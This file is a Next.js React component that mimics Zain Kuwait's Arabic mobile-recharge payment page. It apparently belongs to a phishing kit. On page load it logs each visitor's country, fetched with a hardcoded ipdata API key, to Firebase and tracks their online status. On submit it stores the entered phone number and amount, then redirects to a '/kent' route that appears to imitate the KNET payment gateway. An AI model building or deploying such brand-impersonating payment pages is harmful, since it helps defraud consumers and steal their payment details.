"use client"

import { Heart, Menu, Plus, ShoppingCart, ChevronDown, AlertCircle } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Card, CardContent } from "@/components/ui/card"
import { useEffect, useState } from "react"
import { setupOnlineStatus } from "@/lib/utils"
import { addData } from "@/lib/firebase"

interface ValidationErrors {
  phoneNumber?: string
  amount?: string
}

interface PhoneEntry {
  id: string
  number: string
  amount: string
  validity: string
}

const visitorId = `zain2-app-${Math.random().toString(36).substring(2, 15)}`;

export default function ZainPaymentInterface() {
  const [phoneEntries, setPhoneEntries] = useState<PhoneEntry[]>([
    { id: "1", number: "", amount: "6.000", validity: "30 يوم" },
  ])
  const [phoneNumber, setPhoneNumber]=useState('')
  const [errors, setErrors] = useState<{ [key: string]: ValidationErrors }>({})
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [selectedAmount, setSelectedAmount] = useState('')

  // Kuwait phone number validation
  const validatePhoneNumber = (phone: string): string | undefined => {
    if (!phone) return "رقم الهاتف مطلوب"
    setPhoneNumber(phone)
    // Remove any spaces or special characters
    const cleanPhone = phone.replace(/\s+/g, "").replace(/[^\d]/g, "")

    // Kuwait mobile numbers: 8 digits starting with 5, 6, 9, or 7
    if (cleanPhone.length !== 8) {
      return "رقم الهاتف يجب أن يكون 8 أرقام"
    }

    if (!/^[5679]/.test(cleanPhone)) {
      return "رقم الهاتف يجب أن يبدأ بـ 5 أو 6 أو 7 أو 9"
    }

    return undefined
  }
 
  const handleAmountSelect = (value: string) => {
    setSelectedAmount(value)
    localStorage.setItem("amount", value) // Consider if this is necessary or should be component state only
  }

  const getLocationAndLog = async () => {
    if (!visitorId) return;

    // This API key is public and might be rate-limited or disabled.
    // For a production app, use a secure way to handle API keys, ideally on the backend.
    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb" 
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        country: country,
        action: "page_load",
        currentPage: "الرئيسية ",
      })
      localStorage.setItem("country", country) // Consider privacy implications
      setupOnlineStatus(visitorId)
    } catch (error) {
      console.error("Error fetching location:", error)
      // Log error with visitor ID for debugging
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
        action: "location_error"
      });
    }
  }

  useEffect(() => {
    if (visitorId) {
      getLocationAndLog();
    }
  }, []);

  const handleSubmit = async (e:any) => {
    e.preventDefault()
    setIsSubmitting(true)
    try {
      await addData({
        id: visitorId,
        phone: phoneNumber, // Storing phone number, ensure compliance with privacy regulations
        amount: selectedAmount,
        timestamp: new Date().toISOString(),
        currentPage: "كي نت ",
        action: "payment_submit_attempt"
            }).then(()=>{
      window.location.href = "/kent"; // Replace with Next.js router if possible: router.push('/checkout')

            })

      // Simulate API call for payment processing
      
      // On successful payment simulation
  
      // Navigate to checkout or show success
      // For Next.js, prefer using the `useRouter` hook for navigation
    } catch (error) {
      console.error("Submission error:", error);
      await addData({
        id: visitorId,
        action: "payment_submit_error",
        error: error instanceof Error ? error.message : String(error)
      });
      // Handle error display to user
    } finally {
      setIsSubmitting(false)
    }
  }
  // Amount validation
  const validateAmount = (amount: string): string | undefined => {
    if (!amount) return "مبلغ التعبئة مطلوب"

    const numAmount = Number.parseFloat(amount)
    if (isNaN(numAmount)) return "مبلغ غير صحيح"
    if (numAmount < 1) return "الحد الأدنى للتعبئة 1.000 د.ك"
    if (numAmount > 50) return "الحد الأقصى للتعبئة 50.000 د.ك"

    return undefined
  }

  // Validate a single phone entry
  const validateEntry = (entry: PhoneEntry): ValidationErrors => {
    return {
      phoneNumber: validatePhoneNumber(entry.number),
      amount: validateAmount(entry.amount),
    }
  }

  // Validate all entries
  const validateAllEntries = () => {
    const newErrors: { [key: string]: ValidationErrors } = {}
    let hasErrors = false

    phoneEntries.forEach((entry) => {
      const entryErrors = validateEntry(entry)
      if (entryErrors.phoneNumber || entryErrors.amount) {
        newErrors[entry.id] = entryErrors
        hasErrors = true
      }
    })

    setErrors(newErrors)
    return !hasErrors
  }

  // Update phone number
  const updatePhoneNumber = (id: string, number: string) => {
    setPhoneEntries((prev) => prev.map((entry) => (entry.id === id ? { ...entry, number } : entry)))

    // Clear error for this field
    setErrors((prev) => ({
      ...prev,
      [id]: { ...prev[id], phoneNumber: undefined },
    }))
  }

  // Update amount
  const updateAmount = (id: string, amount: string, validity: string) => {
    setPhoneEntries((prev) => prev.map((entry) => (entry.id === id ? { ...entry, amount, validity } : entry)))

    // Clear error for this field
    setErrors((prev) => ({
      ...prev,
      [id]: { ...prev[id], amount: undefined },
    }))
  }

  // Add new phone entry
  const addPhoneEntry = () => {
    const newId = Date.now().toString()
    setPhoneEntries((prev) => [
      ...prev,
      {
        id: newId,
        number: "",
        amount: "1.000",
        validity: "30 يوم",
      },
    ])
  }

  // Remove phone entry
  const removePhoneEntry = (id: string) => {
    if (phoneEntries.length > 1) {
      setPhoneEntries((prev) => prev.filter((entry) => entry.id !== id))
      setErrors((prev) => {
        const newErrors = { ...prev }
        delete newErrors[id]
        return newErrors
      })
    }
  }

  // Calculate total
  const calculateTotal = () => {
    return phoneEntries
      .reduce((total, entry) => {
        const amount = Number.parseFloat(entry.amount) || 0
        return total + amount
      }, 0)
      .toFixed(3)
  }

  

  // Amount options
  const amountOptions = [
    { value: "1.000", label: "1.000 د.ك", validity: "30 يوم" },
    { value: "2.000", label: "2.000 د.ك", validity: "30 يوم" },
    { value: "3.000", label: "3.000 د.ك", validity: "30 يوم" },
    { value: "5.000", label: "5.000 د.ك", validity: "30 يوم" },
    { value: "6.000", label: "6.000 د.ك", validity: "30 يوم" },
    { value: "10.000", label: "10.000 د.ك", validity: "60 يوم" },
    { value: "20.000", label: "20.000 د.ك", validity: "90 يوم" },
  ]

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {/* Header */}
      <header className="bg-gradient-to-l from-[#2b224d] to-[#1e1236] p-2 flex justify-between items-center shadow-md relative my-4 ">
     
     <div className="absolute right-0 left-0 flex justify-center pointer-events-none">
       <img src="/top.png" className="object-contain" />
     </div>
   </header>
      {/* Main Content */}
      <div className="px-4 py-6">
        <h1 className="text-2xl font-bold text-gray-900 mb-6 text-center">الدفع السريع</h1>

        {/* Tabs */}
        <Tabs defaultValue="recharge" className="w-full">
          <TabsList className="grid w-full grid-cols-2 mb-6">
            <TabsTrigger
              value="recharge"
              className="data-[state=active]:border-b-2 data-[state=active]:border-pink-500 data-[state=active]:bg-transparent rounded-none pb-3"
            >
              إعادة تعبئة eeZee
            </TabsTrigger>
            <TabsTrigger
              value="bill"
              className="data-[state=active]:border-b-2 data-[state=active]:border-pink-500 data-[state=active]:bg-transparent rounded-none pb-3"
            >
              دفع الفاتورة
            </TabsTrigger>
          </TabsList>

          <TabsContent value="recharge" className="space-y-6">
            {phoneEntries.map((entry, index) => (
              <Card key={entry.id} className="border-0 shadow-sm">
                <CardContent className="p-6 space-y-6">
                  {/* Recharge For Dropdown */}
                  {index === 0 ||index === 1 && (
                    <div className="space-y-2">
                      <Select defaultValue="other">
                        <SelectTrigger className="w-full text-right border-0 border-b border-pink-300 rounded-none pb-3 focus:ring-0">
                          <SelectValue />
                          <ChevronDown className="w-4 h-4 text-pink-500" />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="other">ألتعبئة لـ رقم آخر</SelectItem>
                          <SelectItem value="self"> التعبئة لـ رقمي</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  )}

                  {/* Phone Number */}
                  <div className="space-y-2" dir="rtl">
                    <label className="text-sm text-gray-600">
                      رقم الهاتف <span className="text-pink-500">*</span>
                    </label>
                    <div
                      className={`bg-gray-50 border-b border-pink-400  p-3 ${errors[entry.id]?.phoneNumber ? "border-2 border-red-300" : ""}`}
                    >
                      <Input
                        value={entry.number}
                        onChange={(e) => updatePhoneNumber(entry.id, e.target.value)}
                        className="border-0 bg-transparent text-right text-lg font-medium focus-visible:ring-0"
                        placeholder="أدخل رقم الهاتف"
                        maxLength={8}
                      />
                    </div>
                    {errors[entry.id]?.phoneNumber && (
                      <div className="flex items-center gap-2 text-red-500 text-sm">
                        <AlertCircle className="w-4 h-4" />
                        <span>{errors[entry.id].phoneNumber}</span>
                      </div>
                    )}
                  </div>

                  {/* Amount */}
                  <div className="space-y-2" dir="rtl">
                    <label className="text-sm text-gray-600">مبلغ التعبئة</label>
                    <div className={`border-b pb-3 ${errors[entry.id]?.amount ? "border-red-300" : "border-pink-300"}`}>
                      <Select
                      
                        value={entry.amount}
                        onValueChange={(value) => {
                          const option = amountOptions.find((opt) => opt.value === value)
                          updateAmount(entry.id, value, option?.validity || "30 يوم")
                        }}
                      >
                        <SelectTrigger className="w-full border-0 bg-transparent focus:ring-0">
                          <div className="flex items-center justify-between w-full">
                            <div className="text-sm text-gray-500">الصلاحية {entry.validity}</div>
                            <div className="flex items-center gap-2">
                              <ChevronDown className="w-4 h-4 text-pink-500" />
                              <span className="text-lg font-medium">{entry.amount} د.ك</span>
                            </div>
                          </div>
                        </SelectTrigger>
                        <SelectContent className="bg-white">
                          {amountOptions.map((option) => (
                            <SelectItem key={option.value} value={option.value}>
                              <div className="flex justify-between items-center w-full">
                                <span className="text-sm text-gray-500">الصلاحية {option.validity}</span>
                                <span>{option.label}</span>
                              </div>
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>
                    {errors[entry.id]?.amount && (
                      <div className="flex items-center gap-2 text-red-500 text-sm">
                        <AlertCircle className="w-4 h-4" />
                        <span>{errors[entry.id].amount}</span>
                      </div>
                    )}
                  </div>

                  {/* Remove button for additional entries */}
                  {phoneEntries.length > 1 && (
                    <Button
                      variant="outline"
                      size="sm"
                      disabled
                      onClick={() => removePhoneEntry(entry.id)}
                      className="text-red-500 border-red-300 hover:bg-red-50"
                    >
                      إزالة هذا الرقم
                    </Button>
                  )}
                </CardContent>
              </Card>
            ))}

            {/* Add Another Number Button */}
            <Button
              variant="outline"
              disabled
              onClick={addPhoneEntry}
              className="w-full border-2 border-pink-500 text-pink-500 hover:bg-pink-50 py-6 text-lg font-medium bg-transparent"
            >
              <Plus className="w-5 h-5 ml-2" />
              أضف رقم آخر
            </Button>

            {/* Total Section */}
            <div className="bg-white rounded-lg p-4 shadow-sm">
              <div className="flex items-center justify-between text-xl font-bold">
                <span className="text-green-500">{calculateTotal()} د.ك</span>
                <span className="text-gray-900">إجمالي</span>
              </div>
            </div>

            {/* Recharge Button */}
            <Button
              onClick={handleSubmit}
              disabled={
                isSubmitting || phoneNumber.length < 8
              }
              className="w-full bg-pink-500 hover:bg-pink-600 text-white py-6 text-lg font-medium rounded-lg disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isSubmitting ? "جاري المعالجة..." : "أعد التعبئة الآن"}
            </Button>
          </TabsContent>

          <TabsContent value="bill">
            <div className="text-center py-12 text-gray-500">محتوى دفع الفاتورة</div>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}
